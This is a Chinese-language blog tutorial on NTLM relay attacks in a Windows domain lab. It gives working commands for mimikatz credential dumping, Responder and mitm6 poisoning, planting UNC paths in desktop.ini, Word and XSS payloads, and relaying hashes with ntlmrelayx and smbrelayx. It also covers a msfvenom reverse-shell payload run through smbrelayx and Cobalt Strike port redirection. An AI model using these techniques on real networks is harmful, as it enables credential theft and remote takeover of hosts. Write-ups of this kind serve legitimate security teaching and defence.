      <a data-url="http://example.com/2021/12/17/CVE-2021-42278&CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" data-id="cl8h223hg0000b3dp2x2g477d" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-浅析域内NTLM Relay攻击" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/" class="article-date">
  <time datetime="2021-12-15T08:50:00.000Z" itemprop="datePublished">2021-12-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/">浅析域内NTLM Relay攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="浅析域内NTLM-Relay攻击"><a href="#浅析域内NTLM-Relay攻击" class="headerlink" title="浅析域内NTLM Relay攻击"></a>浅析域内NTLM Relay攻击</h1><h2 id="域环境下的认证体系"><a href="#域环境下的认证体系" class="headerlink" title="域环境下的认证体系"></a>域环境下的认证体系</h2><p>​    <code>Windows</code>的身份认证方式有两种，一种是<code>NTLM</code>认证方式，即挑战/响应机制；另外一种就是<code>Kerberos</code>认证方式。</p>
<p>​    早期，<code>Windows</code>域环境下使用<code>NTLM</code>作为认证方式，后来采用了<code>Kerberos</code>协议。在默认环境下，<code>NTLM</code>认证和<code>Kerberos</code>认证同时存在于域环境下。当我们指定主机名的时候，会选用<code>Kerberos</code>来作为认证方式：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122170702159.png" alt="image-20211122170702159"></p>
<p>而当指定主机<code>ip</code>的时候，会采用<code>NTLM</code>认证方式。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122170811033.png" alt="image-20211122170811033"></p>
<p>​    因此，在<code>Windows</code>域环境下，针对不同的认证机制，也存在不同的攻击手段。</p>
<p>​    这里主要讨论<code>NTLM</code>中继攻击，因此主要介绍一些<code>NTLM</code>认证协议。<code>NTLM</code>身份认证可以分为两种，一种是本地认证，一种是网络认证。</p>
<h3 id="NTLM-本地认证"><a href="#NTLM-本地认证" class="headerlink" title="NTLM`本地认证"></a>NTLM`本地认证</h3><p>​    <code>Windows</code>将用户的密码存储在本地计算机的<code>SAM</code>文件中，文件位置：<code>C:\Windows\System32\config\SAM</code>。密码的存储以<code>NTLM Hash</code>的方式进行存储。当用户输入密码进行本地认证时，首先系统会将明文密码处理成<code>NTLM Hash</code>，然后与<code>SAM</code>文件中的<code>Hash</code>进行比较，相同则认证通过。同时，会在<code>lsass.exe</code>进程中，保存一份明文密码。</p>
<p>​    这里也提到，<code>lsass</code>进程会缓存一份明文密码，当获取到一台主机权限之后，可以利用<code>mimikatz</code>从<code>lsass</code>进程中导出密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102058524.png" alt="image-20211126102058524"></p>
<h3 id="NTLM-网络认证"><a href="#NTLM-网络认证" class="headerlink" title="NTLM`网络认证"></a>NTLM`网络认证</h3><p>​    <code>NTLM</code>的网络认证，仔细细分可以分为工作组环境下的认证和域环境下的认证。大致原理相同，都是采用<code>Challenge/Response</code>验证机制。</p>
<p>​    在工作组环境下，<code>NTLM</code>认证主要分为三步：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102144904.png" alt="image-20211126102144904"></p>
<p>​    1）客户端首先会在本地缓存一份用户输入的密码值对应的<code>NTLM Hash</code>，然后向服务端发送<code>Negotiate</code>协商消息，去指定需要协商认证的用户、机器以及其他相关信息。</p>
<p>​    2）服务端接收到<code>Negotiate</code>协商消息之后，会将数据传输给<code>NTLM SSP</code>进行处理，然后获得一个返回的16位随机值，称之为<code>Challenge</code>，将其发送给客户端，并在本地缓存该<code>Challenge</code>。</p>
<p>​    3）客户端提取出来<code>Challenge</code>之后，使用本地缓存的<code>NTLM Hash</code>值对其进行加密，得到的值成为<code>Net-NTLM Hash</code>，然后将该值封装到<code>Authenticate</code>认证消息中传输给服务端。</p>
<p>​    4）服务端收到认证消息之后，会使用自己的密码对应的<code>NTLM Hash</code>值对本地缓存的<code>Challenge</code>进行哈希处理，然后将得到的值与认证消息中的<code>Net-NTLM Hash</code>进行比较，如果匹配则认证通过。</p>
<p>​    在域环境下，<code>NTLM</code>的认证方式与上面基本相同，唯一不同点是第4步，服务端会向域控请求校验。</p>
<p>​    <img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126102204524.png" alt="image-20211126102204524"></p>
<h2 id="中继攻击原理解析"><a href="#中继攻击原理解析" class="headerlink" title="中继攻击原理解析"></a>中继攻击原理解析</h2><p>​        <code>NTLM Hash</code>值分为三种，分别为<code>NTLMv1</code>、<code>NTLMv2</code>、<code>NTLM session v2</code>，<code>Net-NTLM Hash</code>根据不同的类型的<code>NTLM Hash</code>加密，可以分为<code>Net-NTLM Hash v1</code>和<code>Net-NTLM Hash v2</code>。其中，<code>NTLM v1</code>强度比较低，易于破解，当获取到此<code>Net-NTLM Hash v1</code>值的时候，可以直接进行破解获取到明文。而<code>NTLM v2</code>相对来说密码强度较高，可以进行暴力破解，但是需要比较强大的字典。通常情况下，<code>NTLM Hash</code>的值都是<code>NTLM v2</code>，因此想要直接获取到明文，相对来说比较困难。因此，可以采用另外一种攻击方式，即<code>NTLM Relay</code>攻击。</p>
<p>​        <code>NTLM Relay</code>攻击其实就是攻击者转发客户端的所有请求给服务端，从而完成认证。这是一种中间人攻击的方式，其实也就是对获取到的<code>Net-NTLM Hash</code>进行重放。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126103516823.png" alt="image-20211126103516823"></p>
<p>​    攻击的关键是如何中间截获数据包，获取到<code>Net-NTLM Hash</code>值。下面介绍一些常见的捕获<code>Net-NTLM Hash</code>方法。</p>
<h3 id="利用LLMNR和NetBIOS欺骗"><a href="#利用LLMNR和NetBIOS欺骗" class="headerlink" title="利用LLMNR和NetBIOS欺骗"></a>利用<code>LLMNR</code>和<code>NetBIOS</code>欺骗</h3><p>​    <code>LLMNR</code>全称链路本地多播名称解析，是基于域名系统（<code>DNS</code>）数据包格式的协议，<code>IPv4</code>和<code>IPv6</code>的主机可以通过此协议对同一本地链路上的主机执行名称解析。简单理解为就是一种在局域网内寻找主机的协议。</p>
<p>​    <code>NetBios</code>全称网络基本输入输出系统，它提供了<code>OSI</code>模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。<code>NetBIOS</code>也是计算机的标识名称，主要用于局域网内计算机的互访。<code>NetBIOS</code>的工作流程就是正常的机器名解析查询应答过程。在<code>Windows</code>操作系统中，默认情况下在安装<code> TCP/IP</code> 协议后会自动安装<code>NetBIOS</code>。</p>
<p>​    <code>Windows</code>解析主机名的顺序为：</p>
<p>​    1）查看本地<code>hosts</code>文件</p>
<p>​    2）查看<code>DNS</code>缓存或者<code>DNS</code>服务器中进行查找</p>
<p>​    3）利用<code>LLMNR</code>（链路本地多播名称解析）和<code>NetBIOS</code>名称服务进行查找</p>
<p>​    在局域网环境下，当用户输入了一个不存在的，或者错误的，<code>DNS</code>中不存在的主机名的时候，<code>Windows</code>系统根据主机名解析的顺序开始查找，最终在局域网内广播<code>LLMNR/NBNS</code>数据包来请求解析主机名。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122215648315.png" alt="image-20211122215648315"></p>
<p>​    而此时，如果我们以及拥有了一台局域网主机的权限，我们就可以假装成受害者想要访问的主机，从而让受害者交出凭证。</p>
<p>​    例如，使用<code>Responder</code>工具在局域网下开启监听，等待局域网内广播的数据包。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -f -v</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122221956730.png" alt="image-20211122221956730"></p>
<p>​    然后我在域控主机上利用<code>SMB</code>协议随便访问一个不存在主机：<code>dir \\m1sn0w\c$</code>，之后监听主机就可以接收到返回来的<code>Net-NTLM Hash</code>值：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122222202985.png" alt="image-20211122222202985"></p>
<p>​    抓取流量包，可以看见，首先进行了广播，然后监听的攻击机（10.10.10.24）响应域控，告诉自己是<code>m1sn0w</code>主机。之后两台机器进行了<code>NTLM</code>认证，域控主机向攻击机发送了<code>Net-NTLM Hash</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211122222659285.png" alt="image-20211122222659285"></p>
<h3 id="利用WPAD劫持"><a href="#利用WPAD劫持" class="headerlink" title="利用WPAD劫持"></a>利用<code>WPAD</code>劫持</h3><p>​    <code>WPAD</code>全称为网络代理自动发现协议，它是客户端使用<code>DHCP</code>、<code>DNS</code>、<code>LLMNR</code>、<code>NBNS</code>协议来定位一个代理自动配置文件<code>URL</code>的方法。</p>
<p>​    代理自动配置文件（<code>PAC</code>），定义了浏览器或者其他代理如何选择适当的代理服务器来访问其要访问的<code>URL</code>。</p>
<p>​    也就是说，通过劫持<code>WPAD</code>，返回一个恶意构造好的<code>PAC</code>文件。然后客户端就会从这个<code>PAC</code>文件中去选择合适的代理服务器。由于远程<code>PAC</code>文件可以指定为攻击者自己的<code>V-P-S</code>服务器上的一个伪造文件，因此客户端的代理服务器也就被攻击者控制了。</p>
<p>​    <code>PAC</code>代理自动配置文件的格式如下，文件名为<code>wpad.dat</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function FindProxyForURL(url, host) &#123;</span><br><span class="line"> if (url== &#x27;http://www.baidu.com/&#x27;) return &#x27;DIRECT&#x27;;</span><br><span class="line"> if (host== &#x27;twitter.com&#x27;) return &#x27;SOCKS 127.0.0.10:7070&#x27;;</span><br><span class="line"> if (dnsResolve(host) == &#x27;10.0.0.100&#x27;) return &#x27;PROXY 127.0.0.1:8086;DIRECT&#x27;;</span><br><span class="line"> return &#x27;DIRECT&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    劫持<code>WPAD</code>一般有两种方式，一种是利用<code>LLMNR/NBNS</code>投毒，另外一种是利用<code>ipv6</code>协议，使用<code>DHCPv6</code>进行劫持。</p>
<h4 id="LLMNR-NBNS投毒"><a href="#LLMNR-NBNS投毒" class="headerlink" title="LLMNR/NBNS投毒"></a><code>LLMNR/NBNS</code>投毒</h4><p>​    当浏览器设置了代理为<code>自动检测设置</code>后，用户访问一个<code>URL</code>的时候，主机就会向<code>WPAD/wpad.dat</code>发送查询请求。如果在域环境中，没有对<code>WPAD</code>主机进行配置，本地<code>hosts</code>文件和<code>DNS</code>服务器解析不到这个域名的话，就会通过<code>LLMNR</code>广播的方式，向局域网内的服务器询问该主机对应<code>ip</code>。</p>
<p>​    此时如果攻击者在局域网内，就可以伪造声称自己是<code>WPAD</code>主机，并返回给受害者<code>PAC</code>文件，其中的代理服务器可以指向攻击者自身。客户机收到<code>PAC</code>文件之后，所有的<code>HTTP</code>流量都会经过代理服务器，也就是攻击者的服务器，这也就达到了劫持流量的目的，开启了中间人攻击。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123105444830.png" alt="image-20211123105444830"></p>
<p>​    <code>IE</code>浏览器默认配置为<code>自动检测代理</code>，当攻击机在局域网内监听流量之后，客户端打开<code>IE</code>浏览器并随机访问一个网页时，攻击者就可以伪造成<code>WPAD</code>，向其返回一个<code>PAC</code>文件，并将代理指向自己。</p>
<p>​        <img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211126104403589.png" alt="image-20211126104403589"></p>
<h4 id="DHCPv6"><a href="#DHCPv6" class="headerlink" title="DHCPv6"></a><code>DHCPv6</code></h4><p>​    微软在2016年发布了<code>MS16-077</code>的补丁，添加了两个保护措施：</p>
<p>​    1、禁止系统通过广播协议来解析<code>WPAD</code>文件的位置，只能通过使用<code>DHCP</code>或者<code>DNS</code>协议来确定位置。</p>
<p>​    2、更改了<code>PAC</code>文件下载的默认行为，当通过<code>WinHTTP</code>请求<code>PAC</code>文件的时候，不会自动发送客户端的凭据来响应请求。</p>
<p>​    因此，为了绕过第一个限制，就可以采用<code>DHCP v6</code>的方式。</p>
<p>​    <code>DHCP V6</code>的交互方式：</p>
<p>​    1、客户端向组播地址发送<code>Solicit</code>请求报文</p>
<p>​    2、组播地址包括的整个地址链路范围内的<code>DHCP</code>服务器和中继代理回应一个<code>Advertise</code>消息给客户端。</p>
<p>​    3、客户端会选择优先级最高的服务器发送<code>Request</code>请求。</p>
<p>​    4、相应服务器回复确认地址、委托前缀、配置等信息。</p>
<p>​    也就是说，在<code>IPv6</code>的情况下，攻击者接收到其他机器的<code>DHCP v6</code>组播包之后，可以让受害者的<code>DNS</code>服务器设置成攻击者<code>IPv6</code>地址。这样在进行<code>WPAD</code>查询的时候，就会像攻击者的主机发送请求。</p>
<p>​       利用<code>mitm6</code>工具，该工具自动检测攻击者计算机的<code>IP</code>配置，并以包含攻击者<code>IP</code>作为<code>DNS</code>服务器的<code>DHCPv6</code>应答回复网络中客户端发送的<code>DHCPv6</code>请求进行<code>DNS</code>欺骗，成功之后将目标主机的默认网关将设置成攻击机的<code>IPv6</code>地址。</p>
<p>​    工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/mitm6">https://github.com/dirkjanm/mitm6</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 mitm6.py -d de1ay.com -i eth0</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125233507946.png" alt="image-20211125233507946"></p>
<p>​    </p>
<p>​    第二个限制的绕过方式相对来说就比较简单，只需要在进行<code>HTTP</code>认证的时候，强制用户输入验证信息，即可。在使用<code>Responder</code>工具的时候，使用<code>-F</code>选项。</p>
<h3 id="利用desktop-ini"><a href="#利用desktop-ini" class="headerlink" title="利用desktop.ini"></a>利用<code>desktop.ini</code></h3><p>​    每一个文件夹都含有一个隐藏文件<code>desktop.ini</code>，该文件的作用主要是用来定义文件夹图标之类的信息。在文件夹属性处，去掉相应选项就可以看见每个文件夹下面存在<code>desktop.ini</code>文件。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123130546953.png" alt="image-20211123130546953"></p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123125630342.png" alt="image-20211123125630342"></p>
<p>​    将这里的值设置为<code>UNC</code>路径，当其他用户访问此目录的时候，就会向指定的<code>UNC</code>请求图标资源。配合上面的<code>LLMNR/NBNS</code>投毒，即可获取到<code>Net-NTLM Hash</code>。</p>
<p>​    例如，这里我创建一个<code>m1sn0w</code>文件夹，然后将路径修改成<code>\\m1sn0w\c$</code>。利用<code>responder</code>在局域网内开启监听，当我再次打开<code>m1sn0w</code>文件夹的时候，攻击机就可以捕获到<code>Net-NTLM Hash</code>。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123130847099.png" alt="image-20211123130847099"></p>
<h3 id="利用office文件钓鱼"><a href="#利用office文件钓鱼" class="headerlink" title="利用office文件钓鱼"></a>利用<code>office</code>文件钓鱼</h3><p>​    该利用方式也是利用<code>UNC</code>路径，当用户打开<code>Word</code>文档之后，就会自动向指定的<code>UNC</code>发送请求。制作方式：</p>
<p>​    创建一个<code>word</code>文档，然后添加一张图片进去：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123131804865.png" alt="image-20211123131804865"></p>
<p>​    保存之后将文件后缀更改成<code>zip</code>，然后解压缩。在<code>word\_rels\document.xml.rels</code>中找到图片的位置，然后修改成<code>UNC</code>路径：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123131941484.png" alt="image-20211123131941484"></p>
<p>​    修改属性值为<code>Target=&quot;\\m1sn0w\c$&quot; TargetMode=&quot;External&quot;</code>，然后压缩之后修改后缀为<code>docx</code>。当用户打开该<code>word</code>文档之后，便会向局域网内发送广播数据包，攻击者就可以获取到<code>Net-NTLM Hash</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124174042882.png" alt="image-20211124174042882"></p>
<p>​    查看流量数据，可发现广播了数据包去询问主机<code>m1sn0w</code>:</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124174007744.png" alt="image-20211124174007744"></p>
<h3 id="利用Web漏洞或者数据库"><a href="#利用Web漏洞或者数据库" class="headerlink" title="利用Web漏洞或者数据库"></a>利用<code>Web</code>漏洞或者数据库</h3><p>​    例如<code>XSS</code>漏洞，设置一个<code>UNC</code>路径，当客户端运行加载的时候，就会在局域网内进行广播：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;\\m1sn0w\c$&quot; &gt;</span><br></pre></td></tr></table></figure>

<h2 id="攻击面扩展"><a href="#攻击面扩展" class="headerlink" title="攻击面扩展"></a>攻击面扩展</h2><p>​    当获取到<code>Net-NTLM Hash</code>之后，接下来需要做的就是如何利用该哈希。<code>NTLM</code>是一种底层的认证协议，通常会将获取的<code>Net-NTLM Hash</code>配合上层协议进行攻击。针对<code>Net-NTLM Hash</code>的攻击方式有两种，一种就是直接对其进行暴力破解，另外一种就是通过重放的方式，<code>Relay</code>到其他机器上。（只要是支持<code>NTLM SSP</code>的协议，都可以中继过去）一种比较常见的方式就是中继到<code>SMB</code>服务器上。（还可以中继到其他的服务，例如<code>EWS</code>、<code>LDAP</code>等）</p>
<p>​    如果能直接<code>Relay</code>到<code>SMB</code>服务器，就相当于可以直接控制目标服务器，可以在目标服务器上远程命令执行，文件上传，下载文件等操作。在域环境中，只有域控主机默认开启<code>SMB</code>签名，这是一种服务器与客户端协商以使用继承的会话密钥对所有传入的数据包进行数字签名的配置。</p>
<h3 id="利用MultiRelay-py进行攻击"><a href="#利用MultiRelay-py进行攻击" class="headerlink" title="利用MultiRelay.py进行攻击"></a>利用<code>MultiRelay.py</code>进行攻击</h3><p>​    因此，在进行<code>Relay</code>攻击之前，可以通过<code>responder</code>工具包下的<code>RunFinger.py</code>脚本对域内主机的开放情况做一个探测：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RunFinger.py -i 10.10.10.1/24 </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123143004804.png" alt="image-20211123143004804"></p>
<p>​    可以看见只有域控主机开启了<code>SMB</code>签名，因此，接下来尝试通过捕获到域管的<code>Net-NTLM Hash</code>，然后中继到其他两台机器上进行命令执行。</p>
<p>​    利用<code>responder</code>工具包下的<code>MultiRelay.py</code>脚本进行攻击，如果<code>Relay</code>成功，可以直接获取到目标主机的<code>Shell</code>。这里我尝试<code>Relay</code>到<code>Win2008</code>上面，即<code>10.10.10.18</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 MultiRelay.py -t 10.10.10.18 -u ALL</span><br></pre></td></tr></table></figure>

<p>​    然后在局域网内开启<code>responder</code>，此时要修改一下配置，不让<code>responder</code>抓取<code>Net-NTLM Hash</code>，而由<code>MultiRelay</code>进行中继，关闭<code>SMB</code>和<code>HTTP</code>即可。（配置文件路径：<code>/usr/share/responder/Responder.conf</code>）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123152236668.png" alt="image-20211123152236668"></p>
<p>​    之后我在域控上随机发送<code>SMB</code>流量，待攻击机监听后，转由<code>MultiRelay</code>进行中继，即可获取到目标主机的<code>Shell</code>。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123152518787.png" alt="image-20211123152518787"></p>
<h3 id="利用smbrelayx-py进行攻击"><a href="#利用smbrelayx-py进行攻击" class="headerlink" title="利用smbrelayx.py进行攻击"></a>利用<code>smbrelayx.py</code>进行攻击</h3><p>​    该工具的原理就是在本地临时搭建一个<code>SMB</code>服务，当域内主机访问该主机时，就会截获<code>Net-NTLM Hash</code>，并中继到其他机器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h target_ip -c command</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125095946249.png" alt="image-20211125095946249"></p>
<h3 id="利用ntlmrelayx-py进行攻击"><a href="#利用ntlmrelayx-py进行攻击" class="headerlink" title="利用ntlmrelayx.py进行攻击"></a>利用<code>ntlmrelayx.py</code>进行攻击</h3><p>​    工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t smb://10.10.10.18 -c whoami -smb2support</span><br></pre></td></tr></table></figure>

<p>​    然后利用<code>responder</code>开启局域网内的监听，待域控主机发送广播数据报之后，攻击机响应数据报，截获域管的<code>Net-NTLM Hash</code>之后，中继到<code>10.10.10.18</code>，与之进行通信。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211123162044505.png" alt="image-20211123162044505"></p>
<h2 id="实网对抗下的中继打法"><a href="#实网对抗下的中继打法" class="headerlink" title="实网对抗下的中继打法"></a>实网对抗下的中继打法</h2><h3 id="被动攻击方式"><a href="#被动攻击方式" class="headerlink" title="被动攻击方式"></a>被动攻击方式</h3><p>​    前面在中继攻击<code>SMB</code>的时候用到的<code>smbrelayx.py</code>脚本，它用于在本地临时搭建一个<code>SMB</code>服务，当域内其他用户访问这个服务的时候，就可以捕获<code>Net-NTLM Hash</code>，从而中继到其他机器上面。</p>
<p>​    但是在实际场景下，这种方法要实现起来比较困难。首先当前机器的445端口要没有被占用，一般在<code>Windows</code>操作系统下，445端口都是被占用的。其次就是需要目标机器存在<code>Python</code>环境。因此，如果在内网环境下，目标机器是<code>Linux</code>的话，可以考虑利用此方式。</p>
<p>​    实验拓扑环境如下：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125101135803.png" alt="image-20211125101135803"></p>
<p>​    我在主机<code>10.10.10.24</code>上通过<code>smbrelayx.py</code>临时搭建一个<code>SMB</code>服务，然后将捕获的<code>Net-NTLM Hash</code>中继到受害者机器<code>10.10.10.18</code>上面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h 10.10.10.18 -c whoami</span><br></pre></td></tr></table></figure>

<p>​    当域内主机访问<code>10.10.10.24</code>的<code>SMB</code>，就会与其进行<code>NTLM</code>认证，然后捕获到<code>Net-NTLM Hash</code>之后，中继到其他机器：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125100540635.png" alt="image-20211125100540635"></p>
<p>​    也可以和其他工具联动，例如可以通过<code>msfvenom</code>生成一个<code>shell.exe</code>，然后放置到攻击机上面。当中继攻击成功以后，可以让他下载本地的<code>shell.exe</code>并运行，这样，在<code>msf</code>中开启监听后，就可以获取到目标的<code>shell</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 生成shell.exe</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.24 LPORT=8899 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<p>​    然后使用<code>exploit/multi/handler</code>，配置<code>AutoRunScript</code>，当获取到<code>shell</code>让他进程自动迁移，避免<code>shell</code>文件被删除时连接的<code>shell</code>断开：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript post/windows/manage/migrate</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125102540282.png" alt="image-20211125102540282"></p>
<p>​    然后临时搭建<code>SMB</code>服务，利用<code>smbrelayx.py</code>的<code>-e</code>参数指定下载运行的文件路径，让获取到<code>Net-NTLM Hash</code>之后，<code>msf</code>就会收到反弹获取的<code>shell</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbrelayx.py -h 10.10.10.18 -e ../../shell.exe</span><br></pre></td></tr></table></figure>

<h3 id="主动攻击方式"><a href="#主动攻击方式" class="headerlink" title="主动攻击方式"></a>主动攻击方式</h3><h4 id="PortBender流量重定向"><a href="#PortBender流量重定向" class="headerlink" title="PortBender流量重定向"></a><code>PortBender</code>流量重定向</h4><p>​    在实际的网络拓扑环境下，一般都是通过团队服务器向目标主机上传一个<code>beacon</code>后获取权限。此时进行中继攻击就会存在几个问题，比如：目标445端口已经被占用，所以不能直接嗅探该端口传入的流量。又或者目标<code>Windows</code>主机上没有一些语言环境，操作不方便。</p>
<p>​    最简单的一种实网拓扑结构：图来自<code>https://rastamouse.me/ntlm-relaying-via-cobalt-strike/</code></p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211124175507506.png" alt="image-20211124175507506"></p>
<p>​    <code>TeamServer</code>位于互联网。当目标主机通过<code>beacon</code>控制之后，如果要利用<code>NTLM Relay</code>攻击中继到内网的其他机器，最简单的做法就像上面那样，开启监听之后<code>Relay</code>到其他机器，但这里存在的一个问题是，如果目标机器的445端口占用了，也就是说不能直接监听到445的流量，同时，内网环境下，目标通常是<code>Windows</code>操作系统，如果没有装<code>Python</code>，那么有一些工具就不能运行。</p>
<p>​    因此，在对抗过程中，可以使用端口流量的重定向，以及流量转发，代理来实现攻击机通过<code>TeamServer</code>攻击内网。</p>
<p>​    <code>PortBender</code>工具可以用于端口流量的重定向，工具地址：<code>https://github.com/praetorian-inc/PortBender</code>，将<code>PortBender.cna</code>导入到<code>Cobalt Strike</code>中。</p>
<p>​    当获取一个<code>SYSTEM</code>权限的<code>beacon</code>之后，通过<code>upload</code>命令将<code>WinDivert64.sys</code>或者<code>WinDivert32.sys</code>上传到目标主机（根据目标主机的类型），然后执行:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortBender redirect 445 8445</span><br></pre></td></tr></table></figure>

<p>​    此时会将445端口的流量重定向到8445端口，接下来配置<code>rportfwd</code>。</p>
<p>​    <code>Cobalt Strike</code>工具自带的<code>rportfwd</code>，用于远程端口转发，即将目标机器的某个端口流量全部转发到远端指定的一个端口，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 8445 10.10.20.25 445</span><br></pre></td></tr></table></figure>

<p>​    表示将此台（受控端）主机8445端口的流量转发到攻击机（10.10.20.25）的445端口上。也就是说445端口的流量此时通过重定向，发送给了8445端口，由于远程端口转发，本地8445端口流量全部转发到远程主机的445端口上。</p>
<p>​    此时设置一个代理，通过代理运行<code>nltmrelayx.py</code>进行中继攻击的监听：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 开启代理</span><br><span class="line">socks 1080</span><br><span class="line"></span><br><span class="line"># 配置代理/etc/proxychains4.conf</span><br><span class="line">socks4 10.10.20.24 1080</span><br><span class="line"></span><br><span class="line"># 中继攻击监听</span><br><span class="line">proxychains python3 ntlmrelayx.py -t smb://10.10.10.18 -smb2support</span><br></pre></td></tr></table></figure>

<p>​    当受控主机的<code>445</code>端口收到身份认证的流量之后，将会将流量传送到监听的远程攻击主机上，收到<code>Net-NTLM Hash</code>之后，通过<code>socks</code>代理，就可以中继到内网的其他主机。</p>
<p>​    这里顺便提一下，就是此时域内主机主动连接该445端口，是不会进行认证的。（域内主机发送了一个询问流量之后，不会收到来自该主机的响应）因此，单纯利用这种方式被动的等待比较鸡肋。在这种情况下并不是进行被动收集<code>Net-NTLM Hash</code>，而是通过主动攻击的方式，利用一些漏洞，比如打印机漏洞，还有最近比较火的<code>PetitPotam</code>，主动向该端口发送<code>Net-NTLM Hash</code>。</p>
